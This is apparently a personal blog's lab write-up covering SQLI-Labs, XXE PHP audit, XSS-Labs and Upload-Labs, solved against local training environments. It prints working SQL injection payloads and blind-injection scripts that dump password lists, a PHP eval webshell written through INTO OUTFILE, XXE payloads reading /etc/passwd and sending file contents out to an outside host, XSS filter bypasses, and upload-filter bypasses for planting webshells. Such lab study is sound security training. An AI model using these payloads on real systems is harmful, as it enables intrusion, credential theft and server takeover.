# SQLI-LABS

## LESS-1

先测注入点，`id=0 or 1=1`时无返回，`id=0'`出现报错页面，证明是一个字符型的注入。

测列数，`id=1' order by 3%23`，返回正常，`id=1' order by 4%23`，返回错误，说明列数为3。

![image](https://evalexp.top/p/24231/image-20220325142621880.png)

![image](https://evalexp.top/p/24231/image-20220325142638449.png)

接下来通过联合注入判断回显位置：`id=0%27/**/union/**/select/**/1,2,3/**/%23`：

HTML

```
<font size='5' color= '#99FF00'>Your Login name:2<br>Your Password:3</font>
```

可以发现2，3均被回显，于是接下来通过注入获取表名，表名存储在information_schema中的columns表中，列名为table_name。

稍作解释如下，在information_schema的columns表中：

| 列名         | 数据含义     |
| ------------ | ------------ |
| table_name   | 表名         |
| table_schema | 表所在数据库 |
| column_name  | 列明         |

请求如下：

```
id=0%27/**/union/**/select/**/1,2,group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()%23
```

可以得到：

HTML

```
<font size='5' color= '#99FF00'>Your Login name:2<br>Your Password:emails,referers,uagents,users</font>
```

说明表有`emails`、`referers`、`uagents`、`users`。

查users的结构：

```
id=0'/**/union/**/select/**/1,2,group_concat(distinct/**/column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x7573657273/**/and/**/table_schema=database()%23
```

此处进行十六进制转换，`0x7573657273`实际为`users`。

可以得到结构如下：

HTML

```
<font size='5' color= '#99FF00'>Your Login name:2<br>Your Password:id,username,password</font>
```

随便拿一下username：

```
id=0'/**/union/**/select/**/1,2,group_concat(distinct/**/password)/**/from/**/users/**/%23
```

可以得到：

HTML

```
<font size='5' color= '#99FF00'>Your Login name:2<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</font>
```

## LESS-2

常规测试如上，经测试，为整型注入，测试语句：

```
id=0/**/or/**/1=1%23
```

正常返回：

HTML

```
<font size='5' color= '#99FF00'>Your Login name:Dumb<br>Your Password:Dumb</font>
```

经检测列数仍然为4，回显列仍为2，3.

直接注入：

```
id=0/**/union/**/select/**/1,2,group_concat(distinct/**/password)from/**/users%23
```

得到如下：

HTML

```
<font size='5' color= '#99FF00'>Your Login name:2<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</font>
```

## LESS-3

与LESS-1稍微有点改变，使用了括号把输入括了起来，于是手动闭合即可：

```
id=0')/**/union/**/select/**/1,2,group_concat(distinct/**/password)from/**/users%23
```

可以得到：

HTML

```
<font size='5' color= '#99FF00'>Your Login name:2<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</font>
```

## LESS-4

在LESS-3的上面改了一下，把单引号改成双引号就可以过了：

```
id=0")/**/union/**/select/**/1,2,group_concat(distinct/**/password)from/**/users%23
```

可以得到：

HTML

```
<font size='5' color= '#99FF00'>Your Login name:2<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</font>
```

## LESS-5

简单测试注入：

```
id=0'/**/or/**/1=1%23
```

可以发现：

HTML

```
<font size="5" color="#FFFF00">You are in...........<br></font>
```

发现没有回显，不要注释符，回显错误如下：

HTML

```
<font size="3" color="#FFFF00">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1</br></font>
```

能正常报错，那么直接利用报错注入，直接使用updatexml进行报错注入：

```
id=0'/**/or/**/updatexml(2,concat(0x7e,(select/**/group_concat(distinct/**/password)from/**/users)),0)%23
```

可以得到：

HTML

```
<font size="3" color="#FFFF00">XPATH syntax error: '~Dumb,I-kill-you,p@ssword,crappy'</br></font>
```

发现不齐，缺了数据，使用substr进行分割，经计算，每次能带出31个字符，于是：

```
id=0'/**/or/**/updatexml(2,concat(0x7e,substr((select/**/group_concat(distinct/**/password)from/**/users),32,31)),0)%23
```

得到：

HTML

```
<font size="3" color="#FFFF00">XPATH syntax error: '~,stupidity,genious,mob!le,admin'</br></font>
```

依次扩大数字即可得到库中所有数据。

## LESS-6

与LESS-5相比只是将单引号改成了双引号就可以照常注入：

```
id=0"/**/or/**/updatexml(2,concat(0x7e,substr((select/**/group_concat(distinct/**/password)from/**/users),1,31)),0)%23
```

得到：

HTML

```
<font size="3"  color= "#FFFF00">XPATH syntax error: '~Dumb,I-kill-you,p@ssword,crappy'</br></font>
```

照常改大数字即可。

## LESS-7

> 由于需要写文件，Docker镜像为`acgpiano/sqli-labs`，写文件存在问题，粗暴地把/var/www/html改权限为777即可。

一开始没看输出，搞成盲注了，其实应该是利用MySQL写webshell。

测试发现是单引号+双右括号闭合，于是：

```
id=0'))/**/union/**/select/**/1,2,0x3c3f706870206576616c28245f504f53545b615d293b3f3e/**/into/**/outfile/**/'/var/www/html/Less-7/shell.php'%23
```

可以得到如下：

HTML

```
<font color= "#FFFF00">You have an error in your SQL syntax</font>
```

看起来好像出错了，直接测试一下能否连接：

![image](https://evalexp.top/p/24231/image-20220325185125943.png)

可以直接连接。

## LESS-8

没有回显、没有报错，是一个布尔盲注，没有过滤。

直接进行盲注即可，先写盲注脚本。

PYTHON

```
import requests

url = 'http://192.168.237.128:12903/Less-8/?id='

password = ''
hexstr = ''
i = 1
while True:
    left = 32
    right = 128
    mid = (left+right) // 2
    while left < right:
        payload = f"0'/**/or/**/lpad((select/**/group_concat(distinct/**/password)/**/from/**/users),{i},1)>0x{hexstr}{hex(mid)[2:]}%23"

        res = requests.get(url + payload)
        if "You are in..........." in res.text:
            left = mid + 1
        else:
            right = mid
        mid = (left + right) // 2
    if mid <= 32 or mid >= 127:
        break
    password += chr(mid)
    hexstr += hex(mid)[2:]
    i += 1
    print(password)
```

得到结果如下：

![image](https://evalexp.top/p/24231/image-20220325235255510.png)

## LESS-9

回显永远不变，但是参数后跟SQL语句sleep可以看到网页返回速度慢，说明是时间盲注。

将上面的脚本稍微改改就成了时间盲注脚本了：

PYTHON

```
import requests

url = 'http://192.168.237.128:12903/Less-9/?id='

password = ''
hexstr = ''
i = 1
while True:
    left = 32
    right = 128
    mid = (left+right) // 2
    while left < right:
        payload = f"1'/**/or/**/if(lpad((select/**/group_concat(distinct/**/password)/**/from/**/users),{i},1)>0x{hexstr}{hex(mid)[2:]},sleep(0.01),1)%23"

        res = requests.get(url + payload)
        if res.elapsed.microseconds >= 100000:
            left = mid + 1
        else:
            right = mid
        mid = (left + right) // 2
    if mid <= 32 or mid >= 127:
        break
    password += chr(mid)
    hexstr += hex(mid)[2:]
    i += 1
    print(password)
```

> Docker容器里的参数好像有点问题，sleep(1)返回用了12秒，sleep(0.1)用了1.2秒。上面脚本实际使用改一下sleep参数即可。

输出如下：

![image](https://evalexp.top/p/24231/image-20220325235227381.png)

## LESS-10

将单引号改为双引号接着注入即可，脚本和上面的一样，改一下Payload即可：

PYTHON

```
payload = f"1\"/**/or/**/if(lpad((select/**/group_concat(distinct/**/password)/**/from/**/users),{i},1)>0x{hexstr}{hex(mid)[2:]},sleep(0.01),1)%23"
```

> 后面的作业完了再更。

# XXE - PHP Audit Basic

## DOMDocument

没有过滤，直接引用文件作为实体内容成功拿到：

```
<?xml version="1.0"?>
<!DOCTYPE ANY [
	<!ENTITY content SYSTEM "file:///etc/passwd">
]>
<note>
	<name>&content;</name>
</note>
```

![image](https://evalexp.top/p/24231/image-20220327131958996.png)

## SimpleXMLElement

和上面的套路一样，还是外部文件实体即可：

```
<?xml version="1.0"?>
<!DOCTYPE ANY [
	<!ENTITY content SYSTEM "file:///etc/passwd">
]>
<note>
	<name>&content;</name>
</note>	
```

得到：

![image](https://evalexp.top/p/24231/image-20220327132135218.png)

## simplexml_load_string

```
<?xml version="1.0"?>
<!DOCTYPE ANY [
	<!ENTITY content SYSTEM "file:///etc/passwd">
]>
<note>
	<name>&content;</name>
</note>	
```

仍然成功。

## BindXXE

服务器上创建evil.dtd:

```
<!ENTITY % all
    "<!ENTITY &#x25; send SYSTEM 'http://blog.evalexp.top/?data=%file;'>"
>
%all;
```

接着发送：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE updateProfile [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./index.php">
    <!ENTITY % dtd SYSTEM "https://blog.evalexp.top/evil.dtd">
    %dtd;
    %send;
]>

<user><username>admin</username><password>admin</password>
```

一发入魂：

![image](https://evalexp.top/p/24231/image-20220327134402472.png)

![image](https://evalexp.top/p/24231/image-20220327134511491.png)

# XSS-LABS

## Level 1

没有防护，直接注入：

HTTP

```
name=<script>alert(%27xss%27);</script>
```

## Level 2

直接注入`<script>alert('xss');</script>`。响应如图：

![image](https://evalexp.top/p/24231/image-20220327135501043.png)

审查一下返回的响应：

HTML

```
<h2 align=center>没有找到和&lt;script&gt;alert('xss');&lt;/script&gt;相关的结果.</h2><center>
```

实体转义了，此处肯定是无法入手了，看下面的：

HTML

```
<input name=keyword  value="<script>alert('xss');</script>">
```

由于每一次输入都会将改结果存放到value里，因此，只需要闭合前面的双引号即可注入：

payload:

HTML

```
"><script>alert('xss');</script>
```

## Level 3

和上面差不多，但是value中也被实体编码了：

HTML

```
<h2 align=center>没有找到和&lt;script&gt;alert('xss');&lt;/script&gt;相关的结果.</h2><center>
<input name=keyword  value='&lt;script&gt;alert('xss');&lt;/script&gt;'>	
```

注意单引号仍然可以闭合，于是构造事件型payload即可：

HTML

```
' onblur='alert()' onfocus='alert()
```

此时源码为：

HTML

```
<input name=keyword  value='' onblur='alert()' onfocus='alert()'>	
```

鼠标移动到输入框时即可触发。

## Level 4

测试：

HTML

```
<script>alert('xss');</script>
```

返回结果，注意点：

HTML

```
<input name=keyword  value="scriptalert('xss');/script">
```

大小于号均被替换为了空字符串，尝试闭合属性值，事件触发。

HTML

```
" onblur="alert()" onfocus="alert()
```

点击输入框后即可过掉。

## Level 5

上测试Payload，返回结果如下：

HTML

```
<input name=keyword  value="<scr_ipt>alert('xss');</script>">
```

说明把`script`关键字换成了`scr_ipt`，尝试构造事件型。

注入：

HTML

```
" onfocus="alert()"
```

返回：

HTML

```
<input name=keyword  value="" o_nfocus="alert()"">
```

好像是把`on`也给换成了`o_n`，测试一下，直接发送`on`，返回：

HTML

```
<input name=keyword  value="o_n">
```

确实是把`on`给换成了`o_n`，注意到第一次测试时没有对大小于符号进行过滤，于是构造超链接元素中的href属性可调用JS：

HTML

```
"><a href="javascript:alert()
```

## Level 6

测试payload返回如下：

HTML

```
<input name=keyword  value="<scr_ipt>alert('xss');</script>">
```

再次测试，`on`和`href`都被换掉了。

好像没办法了，但是测试可以发现，大小写混写就绕过了。

HTML

```
" OnFocus="alert()
```

## Level 7

测试Payload返回如下：

HTML

```
<input name=keyword  value="<>alert('xss');</>">
```

把`script`换空了，双写绕一下：

HTML

```
<scrscriptipt>alert('xss');</scrscriptipt>
```

返回：

HTML

```
<input name=keyword  value="<script>alert('xss');</script>">
```

说明双写能成功绕过，把前面闭合一下即可。

HTML

```
"><scrscriptipt>alert('xss');</scrscriptipt>
```

## Level 8

有点新意了，把输入的东西放到了a元素的href属性里。

测试payload：

HTML

```
javascript:alert()
```

点击发现没有弹，看源代码：

HTML

```
<a href="javascr_ipt:alert()">友情链接</a>
```

把`javascript`换成了`javascr_ipt`，手动编码一下即可：

HTML

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
```

点击友链即可过。

## Level 9

测试Payload直接提示不合法了。

输入一个正确的URL可以被解析到DOM里，尝试在URL前面加点东西，发现还是可以：

HTML

```
javascript:alert(1);//http://baidu.com
```

返回：

HTML

```
<a href="javascr_ipt:alert(1);//http://baidu.com">友情链接</a>
```

参考上面，把JS处编码绕过即可：

HTML

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;;//http://baidu.com
```

## Level 10

没输入框了，参数在URL里。

输入的东西都被实体转义了，看源代码发现有三个参数，都测了一下。

HTML

```
<form id=search>
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
</form>
```

发现`t_sort`有回显，输出到了value里，于是不用管keyword了，直接使用`t_sort`参数注。

HTTP

```
t_sort="><script>alert();</script>
```

返回的结果里发现大小于号被过滤了。

HTML

```
<input name="t_sort"  value=""scriptalert();/script" type="hidden">
```

把后面的hidden给覆盖掉，再加一个事件触发即可：

HTML

```
t_sort="%20type="text"%20onfocus="alert()
```

## Level 11

跟第十题比较类似，隐藏参数。

一次测试所以参数回显：

HTTP

```
keyword=good%20job!&t_link=1&t_history=2&t_sort=3&t_ref=4
```

还是`t_sort`的回显，直接使用上一关的Payload试试，返回：

HTML

```
<input name="t_sort"  value="&quot; type=&quot;text&quot; onfocus=&quot;alert()" type="hidden">
```

说明这个参数肯定是注入不了了。

看`t_ref`，应该是作者的提示，测试一下Refer头看看：

HTTP

```
GET /level11.php? HTTP/1.1
Host: localhost
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Referer: evalexp.top
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

返回：

HTML

```
<input name="t_ref"  value="evalexp.top" type="hidden">
```

直接用上一次的payload：

HTTP

```
GET /level11.php? HTTP/1.1
Host: localhost
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Referer: " type="text" onfocus="alert()
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

返回：

HTML

```
<input name="t_ref"  value="" type="text" onfocus="alert()" type="hidden">
```

## Level 12

这次换UA了，还是老Payload直接打即可：

HTTP

```
GET /level12.php? HTTP/1.1
Host: localhost
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: " type="text" onfocus="alert()
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

返回：

HTML

```
<input name="t_ua"  value="" type="text" onfocus="alert()" type="hidden">
```

## Level 13

提示Cook，应该是Cookie，直接测试，Fuzz了一下，Cookie中的user字段可以解析，直接Payload：

HTTP

```
GET /level13.php? HTTP/1.1
Host: localhost
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Cookie: user=" type="text" onfocus="alert();
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

返回：

HTML

```
<input name="t_cook"  value="" type="text" onfocus="alert()" type="hidden">
```

## Level 14

EXIF XSS

网站已经修复该漏洞，无法利用。

## Level 15

是一个Angular的框架，然后src=123时：

HTML

```
<span class="ng-include:123">
```

`ng-include`即包含某文件。

尝试包含level1.php，并且传入name参数：

HTTP

```
http://localhost/level15.php?src=%27level1.php?name=%3Cscript%3Ealert();%3C/script%3E%27
```

得到：

HTML

```
<span class="ng-include:'level1.php?name=&lt;script&gt;alert();&lt;/script&gt;'"></span>
```

大小于号被实体转义了，于是构造img事件触发。

Payload如下：

HTTP

```
src="level1.php?name=<img%20src=1%20onerror=%27alert()%27>"
```

## Level 16

HTTP

```
keyword=<script>
```

返回：

HTML

```
<center><&nbsp;></center>
```

说明把`script`换成了空格的实体符，测试image元素：

HTTP

```
keyword=<img%20src=1%20onerror=%27alert()%27>
```

HTML

```
<center><img&nbsp;src=1&nbsp;onerror='alert()'></center>
```

成功创建`img`元素，但是空格被换成了空格实体符，用换行替换空格：

HTTP

```
keyword=<img%0asrc=1%0aonerror=%27alert()%27>
```

> tab一样会被换位空格实体符，因此不可以用%09绕过

## Level 17

Flash的，这东西太古老了，应该没啥网站会用，但是对于`embed`元素，页面的源代码中并没有使用双引号或单引号包围，因此我们可以直接令参数b=%20$payload，如下：

HTTP

```
arg01=a&arg02=%20onmouseover=alert()
```

## Level 18

还是Flash，一样的Payload：

HTTP

```
arg01=a&arg02=%20onmouseover=alert()
```

## Level 19

还是Flash，但是这里双引号被实体转义了，无法闭合前面的，需要反编译swf文件进一步分析，但是Flash已经凉得差不多了，分析出来也没啥意义。跳过

## Level 20

还是反编译Flash分析，没啥意义，不做分析。

# Upload-LABS

> 环境可以使用官方的Docker镜像启动，注意启动后请手动进入容器创建upload文件夹并将拥有者改为www-data。
>
> 准备好Burp、Godzilla或AntSword或Behinder。

## Pass-01

前端限制，直接抓包后修改即可。

![image](https://evalexp.top/p/24231/image-20220327191507017.png)

改为`ws.php`，上传，然后观察返回的源码：

HTML

```
<img src="../upload/ws.php" width="250px" />
```

连接Webshell(With Godzilla)：

![image](https://evalexp.top/p/24231/image-20220327192312437.png)

## Pass-02

源码如下：

PHP

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
```

可以看到实际上是检验了MEMI-Type，还是抓包：

![image](https://evalexp.top/p/24231/image-20220327193023410.png)

改Content-Type为`image/png`后发送。

然后一样审查返回的源码，哥斯拉连之。

## Pass-03

源码如下：

PHP

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

禁止上传php尾缀的文件，考虑使用`phtml`尾缀绕过。

> Docker镜像真是啥啥都没配置好，尾缀解析这些都没有配置好。

修改`/etc/apache2/conf-enabled/docker-php.conf`如下：

```
# <FilesMatch \.php$>
# 	SetHandler application/x-httpd-php
# </FilesMatch>

AddHandler application/x-httpd-php .php .php3 .phtml

DirectoryIndex disabled
DirectoryIndex index.php index.html

<Directory /var/www/>
	Options -Indexes
	AllowOverride All
</Directory>
```

这样就可以了，传一个phtml文件即可绕过。

然后哥斯拉连即可。

## Pass-04

源码如下：

PHP

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

几乎把能解析的尾缀都已经Ban了，但是注意到没有禁用`.htaccess`，这是Apache的一个解析文件，直接上传文件把png解析成php即可。

```
<FilesMatch "evil.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

然后把哥斯拉后门改成evil.png文件名上传即可。

## Pass-05

源代码如下：

PHP

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

可以发现过滤其实并不严谨，还有很多大小写混写的尾缀没有去掉，例如`Php`的尾缀，因此直接上传一个这样的文件即可。

![image](https://evalexp.top/p/24231/image-20220327232309960.png)

然后哥斯拉直接连。

## Pass-06

代码如下：

PHP

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

有转小写，所以没有办法用php尾缀绕过，考虑在后面加一个空格。

![image](https://evalexp.top/p/24231/image-20220327233558156.png)

成功上传。

## Pass-07

先上源码：

PHP

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

可以发现和上面的差距在于没有删点，于是加一个点即可绕过上传。

![image](https://evalexp.top/p/24231/image-20220329164035140.png)

## Pass-08

源代码：

PHP

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这次没有去除`::$DATA`，在Windows环境下，保存的文件实际不会有`::$DATA`，因此我们在文件名末尾加`::$DATA`即可绕过。

由于Docker是在Linux下的，肯定是无法成功的，具体的可以用phpStudy搭建在Windows上测试。

## Pass-09

源代码如下：

PHP

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
